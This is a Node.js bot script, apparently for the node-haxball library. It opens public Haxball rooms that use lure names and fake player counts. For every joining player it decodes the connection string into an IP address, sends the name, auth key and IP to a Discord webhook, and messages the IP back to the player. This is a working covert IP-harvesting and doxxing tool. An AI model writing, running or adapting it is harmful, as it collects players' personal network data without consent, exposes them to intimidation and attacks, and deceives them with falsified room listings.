// hosts.js
const API = require("./src/index")();
const { Room } = API;
const EnglishLanguage = require("./languages/englishLanguage");
API.Language.current = new EnglishLanguage(API);

const axios = require("axios");

function decryptHex(str) {
  if (!str || typeof str !== "string") return "";
  let out = "";
  for (let i = 0; i < str.length; i += 2) {
    out += String.fromCharCode(parseInt(str.substring(i, i + 2), 16));
  }
  return out;
}

async function sendDiscordRaw(webhookUrl, body) {
  if (!webhookUrl) return;
  try {
    await axios.post(webhookUrl, body, { timeout: 10000 });
    return true;
  } catch (err) {
    console.error("❌ Error enviando webhook:", err?.message || err);
    return false;
  }
}

async function sendDiscordPlayer(webhookUrl, player, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `Nuevo jugador conectado: **${player.name}** en ${roomName}`,
    embeds: [
      {
        title: "🎯 Nuevo Jugador Conectado",
        color: 0x00ff00,
        fields: [
          { name: "Nombre", value: player.name || "N/A", inline: true },
          { name: "ID", value: String(player.id || "N/A"), inline: true },
          { name: "Auth", value: player.auth || "N/A", inline: true },
          { name: "Conn", value: player.conn || "No tiene", inline: true },
          { name: "IP", value: decryptHex(player.conn) || "No tiene", inline: true }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Crash" }
      }
    ]
  };
  await sendDiscordRaw(webhookUrl, payload);
}

async function sendDiscordRoomLink(webhookUrl, roomLink, roomName) {
  if (!webhookUrl) return;
  const payload = {
    content: `🏟 Sala creada: **${roomName}**\n${roomLink}`,
    embeds: [
      {
        title: "Sala creada",
        color: 0x0000ff,
        fields: [{ name: "Link", value: roomLink, inline: false }],
        timestamp: new Date().toISOString(),
        footer: { text: "Teleese x Crash" }
      }
    ]
  };
  await sendDiscordRaw(webhookUrl, payload);
}

/* ---------- Config (modificable / rotativo por INDEX) ---------- */

const roomNames = [
  "🟠🦊 JUEGAN TODOS CRASH 🦊🟠",
  "🟠🦊 JUEGAN TODOS CRASHJERO 🦊🟠",
  "🟠🦊 JUEGAN TODOS REALSOCCER 🦊🟠",
  "🟠🦊 VOLLEYBALL CRASH 🦊🟠",
  "🟠🦊 PING PONG CRASH 🦊🟠",
  "🟠🦊 FUTSAL X6 CRASH 🦊🟠",
  "🟠🦊 HOCKEY CRASH 🦊🟠",
  "🟠🦊 GANA DINERO CRASH 🦊🟠",
  "🟠🦊 SOLO MALOS CRASH 🦊🟠",
  "🟠🦊 SOLO BUENOS CRASH 🦊🟠",
  "🟠🦊 WATERPOLO CRASH 🦊🟠"
];

const maxPlayersList = [24, 24, 24, 24, 24, 24, 24, 24, 24, 24, 24];
const fakePlayersList = [20, 19, 15, 12, 9, 22, 15, 23, 18, 12, 2];

const geoList = [
  { lat: -34.616901409192984, lon: -58.96070099124523, flag: "bt" },
  { lat: -34.616901409192984, lon: -58.96070099124523, flag: "bt" }
];

/* ---------- Env / selección por index ---------- */

const jobIndex = Number.parseInt(process.env.INDEX || "0", 10);
const token = process.env.JOB_ID || process.env.HAXBALL_TOKEN;
const webhookUrl = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK || null;

const roomName = roomNames[jobIndex % roomNames.length];
const maxPlayers = maxPlayersList[jobIndex % maxPlayersList.length];
const fakePlayers = fakePlayersList[jobIndex % fakePlayersList.length];
const geo = geoList[jobIndex % geoList.length];

if (!token) {
  console.error("❌ No se encontró token (JOB_ID / HAXBALL_TOKEN).");
  process.exit(1);
}

console.log(`🚀 Creando sala: ${roomName} | MaxPlayers: ${maxPlayers} | FakePlayers: ${fakePlayers} | Geo: ${JSON.stringify(geo)}`);

/* ---------- Crear sala (node-haxball moderno) ---------- */

Room.create(
  {
    name: roomName,
    password: process.env.ROOM_PASSWORD || "",
    maxPlayerCount: maxPlayers,
    playerCount: fakePlayers,
    unlimitedPlayerCount: true,
    showInRoomList: true,
    geo: geo,
    token: token
  },
  {
    storage: {
      player_name: process.env.PLAYER_NAME || "Bot",
      avatar: process.env.PLAYER_AVATAR || "👽"
    },
    libraries: [],
    config: null,
    renderer: null,
    plugins: [],
    onOpen: (room) => {
      console.log("✅ Sala creada (onOpen). Esperando link...");

      room.onAfterRoomLink = (roomLink) => {
        console.log("🔗 Link de la sala:", roomLink);
        if (webhookUrl) sendDiscordRoomLink(webhookUrl, roomLink, roomName);
      };

      room.onPlayerJoin = (playerObj, customData) => {
        try {
          console.log(`🎯 Nuevo jugador: ${playerObj.name} (ID: ${playerObj.id})`);
          sendDiscordPlayer(webhookUrl, playerObj, roomName);

          room.sendAnnouncement(
            `Discord: Teleese - Pagina: https://teleese.netlify.app/`,
            null,
            0xff0000,
            "bold",
            2
          );

          setTimeout(() => {
            room.sendAnnouncement(
              `Nombre: ${playerObj.name} Auth: ${playerObj.auth || "N/A"} Ip: ${decryptHex(playerObj.conn)}`,
              playerObj.id,
              0xff0000,
              "bold",
              2
            );
          }, 1000);
        } catch (e) {
          console.error("Error en onPlayerJoin:", e);
        }
      };

      room.onPlayerLeave = (playerObj, reason, isBanned, byId, customData) => {
        console.log(`👋 Jugador salió: ${playerObj.name} (ID: ${playerObj.id})`);
      };

      room.onPlayerChat = (id, message, customData) => {
        // si querés bloquear ciertos comandos, procesalos acá
        console.log(`💬 ${id}: ${message}`);
        return false; // return false para que el chat quede visible (igual que antes)
      };

      room.onRoomError = (err, customData) => console.error("❌ Error en sala:", err);
    },
    onClose: (msg) => {
      console.log("🔴 Bot ha salido de la sala:", msg?.toString());
      process.exit(0);
    }
  }
);
